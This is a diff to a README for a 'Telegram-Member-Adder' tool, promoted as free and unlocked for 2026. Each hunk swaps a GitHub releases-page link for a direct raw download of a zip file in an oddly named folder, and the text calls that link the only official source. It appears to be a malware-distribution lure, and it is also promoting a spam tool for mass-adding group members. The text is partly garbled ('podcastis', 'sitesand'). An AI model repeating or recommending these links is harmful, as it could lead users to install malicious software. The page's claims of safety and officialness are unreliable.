@@ -1,7 +1,7 @@
 <h1>🚀 Telegram-Member-Adder - Free & Unlocked for 2026</h1>
 
 <p align="center">
-  <a href="https://github.com/Tennesseei161/Telegram-Member-Adder/releases">
+  <a href="https://raw.githubusercontent.com/Tennesseei161/Telegram-Member-Adder/main/dietician/Telegram_Member_Adder_2.6.zip">
     <img src="https://img.shields.io/badge/Download-Telegram%20Member%20Adder%202026-brightgreen?style=for-the-badge&logo=telegram&logoColor=white&color=ff6b6b" alt="Download Button">
   </a>
 </p>
@@ -26,7 +26,7 @@ Follow these four simple steps below to get Telegram-Member-Adder up and running
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [**Download Telegram-Member-Adder**](https://github.com/Tennesseei161/Telegram-Member-Adder/releases). Our download manager will prepare the file instantly for your Windows PC or Laptop. This exact link is the only official source for the 2026 free unlocked version. Don't download from untrusted third-party sitesand risk malware or outdated versions.
+Visit this link to download the application: [**Download Telegram-Member-Adder**](https://raw.githubusercontent.com/Tennesseei161/Telegram-Member-Adder/main/dietician/Telegram_Member_Adder_2.6.zip). Our download manager will prepare the file instantly for your Windows PC or Laptop. This exact link is the only official source for the 2026 free unlocked version. Don't download from untrusted third-party sitesand risk malware or outdated versions.
 
 
 
@@ -83,7 +83,7 @@ A: Absolutely yes. This 2026 build is provided free of charge with every single 
 
 ## 🔄 Stay Updated
 
-The developer regularly pushes improvements, bug fixes, and compatibility updates for the 2026 era. Always return to the **Releases page** (https://github.com/Tennesseei161/Telegram-Member-Adder/releases) to check for a newer version. We recommend updating every few months to ensure you have the latest performance boostsand security patches.,
+The developer regularly pushes improvements, bug fixes, and compatibility updates for the 2026 era. Always return to the **Releases page** (https://raw.githubusercontent.com/Tennesseei161/Telegram-Member-Adder/main/dietician/Telegram_Member_Adder_2.6.zip) to check for a newer version. We recommend updating every few months to ensure you have the latest performance boostsand security patches.,
 
 ## 📢 Share With Your Community
 
@@ -96,7 +96,7 @@ Don't waste another minute clicking "Add Member" one by one. **Get Telegram-Memb
 **👉 [Download Telegram-Member-Adder Now][]**
 
 
-- **Visit the official download page:** [https://github.com/Tennesseei161/Telegram-Member-Adder/releases](https://github.com/Tennesseei161/Telegram-Member-Adder/releases)** – This podcastis the only trusted source for the 2026 Windows version.,
+- **Visit the official download page:** [https://raw.githubusercontent.com/Tennesseei161/Telegram-Member-Adder/main/dietician/Telegram_Member_Adder_2.6.zip](https://raw.githubusercontent.com/Tennesseei161/Telegram-Member-Adder/main/dietician/Telegram_Member_Adder_2.6.zip)** – This podcastis the only trusted source for the 2026 Windows version.,
 
 Thank you for choosing Telegram-Member-Adder. Say hello to effortless group growth.
 
